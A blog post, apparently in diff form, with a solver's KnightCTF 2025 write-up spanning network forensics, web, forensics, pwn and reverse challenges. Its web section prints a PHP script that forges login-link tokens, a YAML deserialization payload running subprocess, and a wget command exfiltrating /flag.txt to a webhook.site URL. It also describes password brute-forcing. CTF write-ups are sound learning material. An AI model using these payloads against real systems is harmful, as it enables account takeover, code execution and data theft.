@@ -1,0 +1,460 @@
+---
+layout: post
+title: "[CTF] KnightCTF-2025 Writeup"
+date: 2025-01-22 +0800
+categories: CTF
+hidden: false
+---
+
+## Networking
+### Server & Attacker IP
+
+>In this challenge, I've crafted a series of intricate scenarios that will test your investigative skills. You'll dive into a network of secrets, uncover hidden identities, and piece together the story of a complex cyber attack. Each step requires careful analysis and keen observation. There are total 17 challenges & 3 pcap files in this category. The files will be provided accordingly. The answers are there, but they won't come easily—you'll need to think like an attacker and act like a detective. Get ready to unravel the mystery and prove your prowess in this thrilling journey.
+>
+>What are the server & attacker IPs?
+
+根據pcap，要找出伺服器和攻擊的IP
+
+![image](/images/2025/01/Hyj2Mmnvkl.png)
+
+
+`KCTF{192.168.1.10_192.168.1.9}`
+
+
+### The Real Admin
+
+>Can you identify the real admin's ip?
+
+發現192.168.1.3正常存取192.168.1.10的admin帳號
+![image](/images/2025/01/SJSt2yaDJe.png)
+
+`KCTF{192.168.1.3}`
+
+### The Intruder's Identity
+
+>The attacker has gained access. Can you find out the username and password he used?
+
+![image](/images/2025/01/r1oRfxaD1e.png)
+
+`KCTF{theexploiter_exploiter@test}`
+
+### Compromising the Admin
+
+>The attacker managed to compromise the admin's credentials. Identify the admin's email and password.
+
+發現到其中一筆登入，Server端回傳Redirect`/admin/dashboard`判斷登入成功
+![image](/images/2025/01/Hkl-BxTwkl.png)
+
+
+
+`KCTF{admin@example.com_password}`
+
+### Stealing the Sweet
+>The attacker utilized a port to steal admin cookies somehow. Can you determine the port & method used for this malicious act?
+
+
+
+![image](/images/2025/01/rkvp_lpDJx.png)
+
+
+`KCTF{8881_xss}`
+
+
+### Malicious Uploads
+>A reverse shell was uploaded by the attacker. What is the name of this file?
+
+
+![image](/images/2025/01/BJzMoepPye.png)
+
+`KCTF{serverfile.php}`
+
+### Shell History
+
+>Before the recent attack, another shell file was already present in the server. Find its name and the date it was used.
+>
+>Flag Format: KCTF{filename.ext_Feb_7}
+
+![image](/images/2025/01/Hy_j2gTDyx.png)
+
+`KCTF{php-reverse-shell.php_Jan_19}`
+
+## Web
+### KnightCal
+
+>In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within.
+
+是一個可以輸入數學表達示的網站
+![image](/images/2025/01/By5y7Q3Dkx.png)
+有限制輸入
+![image](/images/2025/01/H1FGXX3Pyl.png)
+發現到他會先做運算，再把結果轉成字母，再去找相對印的txt
+例如我輸入3-1，是顯示出之前的輸入1+1
+![image](/images/2025/01/S1daMmnw1l.png)
+根據對應可以找到1-9對應字母
+![image](/images/2025/01/SJ-6Q73vJl.png)
+7195對映到flag
+![image](/images/2025/01/SyG2Q7hDkg.png)
+
+### Knight Connect
+
+>In a realm where ancient knights and modern technology collide, a mysterious portal emerges—known as "Knight Connect." Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses.
+>
+>Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits.
+
+在`/contact`頁面下有類似admin的mail
+![image](/images/2025/01/BJaTu42w1e.png)
+
+在 Source Code 中 `/app/Http/Controllers` 存在一段生成和利用連結登入的function如下
+```php
+public function requestLoginUrl(Request $request) {
+    $request->validate([
+        'email' => 'required|email',
+    ]);
+
+    $user = User::where('email', $request->email)->first();
+
+    if (!$user) {
+        return back()->withErrors(['email' => 'Email not found']);
+    }
+
+    $time = time();
+    $data = $user->email . '|' . $time;
+    $token = bcrypt($data);
+
+    $loginUrl = url('/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($user->email));
+
+    return back()->with('success', 'Login link generated, but email sending is disabled.');
+}
+
+public function loginUsingLink(Request $request) {
+    $token = $request->query('token');
+    $time = $request->query('time');
+    $email = $request->query('email');
+
+    if (!$token || !$time || !$email) {
+        return response('Invalid token or missing parameters', 400);
+    }
+
+    if (time() - $time > 3600) {
+        return response('Token expired', 401);
+    }
+
+    $data = $email . '|' . $time;
+    if (!Hash::check($data, $token)) {
+        return response('Token validation failed', 401);
+    }
+
+    $user = User::where('email', $email)->first();
+
+    if (!$user) {
+        return response('User not found', 404);
+    }
+
+    session(['user_id' => $user->id]);
+    session(['is_admin' => $user->is_admin]);
+
+    return redirect()->route('users');
+}
+```
+
+自己生成連結
+```php
+<?php
+$time = 1737404363;
+$email="nomanprodhan@knightconnect.com";
+
+
+$data = $email . '|' . $time;
+
+$token = password_hash($data, PASSWORD_BCRYPT);
+
+$loginUrl = '/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($email);
+echo "https://kctf2025-knightconnect.knightctf.com".$loginUrl;
+```
+
+即可登入任意根據email的帳號
+![image](/images/2025/01/rkIKdN2D1g.png)
+
+
+
+### Baby Injection
+
+可以知道是yaml
+`http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=`
+
+![image](/images/2025/01/SkV1F8nDkg.png)
+
+也能大概確定python框架
+
+![image](/images/2025/01/rypVFIhwJe.png)
+
+把payload base64 encode
+`yaml: !!python/object/apply:subprocess.check_output ["ls"]`
+
+![image](/images/2025/01/Syuwt8nDkg.png)
+
+### Luana
+
+>Show me your skills. Read the /flag.txt
+>
+>Flag Format: KCTF{Fl4G_HeRe}
+>
+>Do not use any automation tools. The server will reset in every 5 minutes.
+
+打開網頁只有寫port6379開啟，網頁是Flask框架
+
+![image](/images/2025/01/ry-FMDnPJe.png)
+
+先用nmap掃描一下
+
+![image](/images/2025/01/SJ_NQD3wkl.png)
+
+根據題目Lua Redis CVE找到一個exploit
+https://github.com/aodsec/CVE-2022-0543
+
+![image](/images/2025/01/rkzaGDhPkl.png)
+
+用wget拿Flag
+```bash
+wget https://webhook.site/af837e63-2038-42cd-b4f7-43da82080c47?flag=`cat /flag.txt`
+```
+
+![image](/images/2025/01/BkSzGv3vkg.png)
+
+
+![image](/images/2025/01/HkY-GDnvJe.png)
+
+### Exceeding Knight
+
+所有routes`routes/web.php`
+```php
+Route::get('/calculator', [CalculatorController::class, 'index']);
+Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission
+
+Route::get('/convert', [UnitConversionController::class, 'index']);
+Route::post('/convert', [UnitConversionController::class, 'convert']);
+
+Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']);
+Route::post('/character-count', [StringManipulationController::class, 'characterCount']);
+
+Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']);
+Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']);
+
+Route::post('/profile', [ProfileController::class, 'index']);
+Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route
+
+Route::get('/', function () {
+    return view('welcome');
+});
+```
+
+因為`/profile`只能用POST，直接存取網頁能發現到在Debug以及錯誤頁面
+
+![image](/images/2025/01/Hkxhi_3DJe.png)
+
+在source code發現Flag在`.env`
+
+![image](/images/2025/01/HJpoeFhw1g.png)
+
+在 `app/Http/Controllers/CalculatorController.php`，發現會根據.env限制字數上限
+
+```php
+public function calculate(Request $request)
+{
+    $request->validate([
+        'num1' => 'required|numeric',
+        'num2' => 'required|numeric',
+        'operation' => 'required|in:add,sub,mul,div',
+    ]);
+
+    $num1 = $request->input('num1');
+    $num2 = $request->input('num2');
+    $operation = $request->input('operation');
+    $limit = env('MAX_CALC_LIMIT', 100000);
+
+    if ($num1 > $limit || $num2 > $limit) {
+        throw new \Exception("You have hit the calculation limit set in the .env file.");
+    }
+
+    $result = match ($operation) {
+        'add' => $num1 + $num2,
+        'sub' => $num1 - $num2,
+        'mul' => $num1 * $num2,
+        'div' => $num2 != 0 ? $num1 / $num2 : throw new \Exception("Division by zero is not allowed."),
+    };
+
+    return view('calculator', ['result' => $result]);
+}
+```
+
+那就嘗試讓他超過上限
+
+![image](/images/2025/01/ry22iu2Pkx.png)
+
+![image](/images/2025/01/rkNW2u3Dyg.png)
+
+錯誤訊息包含.env也就包含FLAG
+
+![image](/images/2025/01/SyaaiO3wyg.png)
+
+## Digital Forensics
+
+### Secret File
+
+
+>My friend's company's employees faced some attacks from hackers. Siam is a very close person to the company owner. Every employee knows that if Siam tells our CEO about anything, he can provide assistance without any hesitation. So, all employees made a statement, and here is the statement: "Triggers don't always require a spark. Sometimes, a simple change can set the stage for transformation. Where might such a trigger reside?" And guess what—the CEO granted him permission to hire an ethical hacker. So, he gave me that finding part. Are you able to help me with this issue?
+>
+>Note: There are almost six users in their company, so anyone can be a victim. Thank you in advance.
+>
+>Findout that One of the user hide some commercial data. Are you able to see that data?
+
+題目提供了
+一個檔案 `kali-linux-2024.ova`
+一組cred (user權限) `username: siam` `password: pmsiam`
+
+首先先用 Grub 把權限提到 root ，發現有下圖這些使用者，每個使用者也都有一些檔案，如GPG、加密zip、一些binary等
+
+![image](/images/2025/01/Hynk7I3wJe.png)
+
+FLAG在`/home/intruder/.maybef149/m3.ini`
+
+![image](/images/2025/01/rym-VU2Dyg.png)
+
+然後在自己加上Format KCTF{}
+
+`KCTF{1nf0rmat1on_N0T_S4f3}`
+
+### Encrypted Data
+
+>An interesting twist: one of the employees holds highly confidential data. If this data is leaked, you will earn your flag. Proceed with care!
+
+
+發現`/home/robot/Documents/.decrypt.txt.gpg`
+去爆破看看
+
+![image](/images/2025/01/H1oGV53w1x.png)
+
+用rockyou爆破
+
+![image](/images/2025/01/ByrD493PJx.png)
+
+拿到FLAG `KCTF{Y0U_h4v3_D3crypt_m3}`
+
+![image](/images/2025/01/H1Q_N92Dke.png)
+
+### Data Scraped
+`/home/bob/Downloads`下存在2個檔案，分別在Artist和Comment，加起來是zip的密碼
+
+![image](/images/2025/01/rJqSOchP1l.png)
+
+解壓後是`challenge_final.jpg`，用stegcracker爆破
+
+![image](/images/2025/01/HkVbdq2D1e.png)
+
+拿到Flag
+
+![image](/images/2025/01/Hkbx_53wkl.png)
+
+
+### Backdoor File
+檔案`/home/alice/Projects/vulnerable`
+
+![image](/images/2025/01/Hys6uq2Dyl.png)
+
+### Find Attacker
+
+>But After finding It proves that Actually siam's computer has been compromised and he also get attacker name and his IP.
+>
+在`/var/log/firewall.log`中發現
+![image](/images/2025/01/HkQQyi3wke.png)
+`KCTF{LEO_203.108.20.803}`
+
+## Pwn
+### Knight's Secret
+
+![image](/images/2025/01/HJvhW6hD1l.png)
+
+
+![image](/images/2025/01/SJ3Fb62vyg.png)
+
+### Knight Bank
+
+輸入1000000就過了
+
+![image](/images/2025/01/S1xiHpnDyg.png)
+
+
+## Reverse
+
+### Knight's Droid
+
+>For ages, a cryptic mechanical guardian has slumbered beneath the Knight’s Citadel. Some say it holds powerful secrets once wielded by ancient code-wielding Knights. Many have tried to reactivate the droid and claim its hidden knowledge—yet none have returned victorious. Will you be the one to solve its riddles and awaken this legendary machine?
+
+題目是一個apk，解壓後，找到類似FLAG，再用caesar-cipher
+
+![image](/images/2025/01/r1mSKThPyg.png)
+
+![image](/images/2025/01/Hy-vY63Dyg.png)
+
+### Binary Quest
+
+發現upx
+`strings binary.quest`
+
+![image](/images/2025/01/BJjAR63Dyg.png)
+
+`upx -d binary.quest`
+
+![image](/images/2025/01/HyVe10hDkx.png)
+
+`KCTF{_W4s_i7_e4sY?_}`
+
+![image](/images/2025/01/ryBz102PJe.png)
+
+### Easy Path to the Grail
+
+`main` function
+
+![image](/images/2025/01/B1RzbAhPJl.png)
+
+`transform_input` function
+
+![image](/images/2025/01/HyeGbA3wJg.png)
+
+`do_fight` function
+
+![image](/images/2025/01/HyIG-RnDyl.png)
+
+```python
+# 目標哈希值
+target_hash = "D2C22A62DEA62CCE9EFA0ECC86CE9AFA4ECC6EFAC6162C3636CC76E6A6BE"
+
+# 位元反轉函數
+def reverse_bits(byte):
+    result = 0
+    for _ in range(8):
+        result = (result << 1) | (byte & 1)  # 將最低位加入結果
+        byte >>= 1  # 右移，處理下一位
+    return result
+
+# 解碼目標哈希值
+def decode_hash(target_hash):
+    decoded = []
+    for i in range(0, len(target_hash), 2):
+        # 取每兩位十六進位值
+        byte_value = int(target_hash[i:i+2], 16)
+        # 還原原始字元
+        original_char = chr(reverse_bits(byte_value))
+        decoded.append(original_char)
+    return ''.join(decoded)
+
+# 執行解碼
+decoded_flag = decode_hash(target_hash)
+print(f"FLAG: {decoded_flag}")
+```
+
+
+## End
+51/759
+
+![image](/images/2025/01/HJzBcSTvke.png)
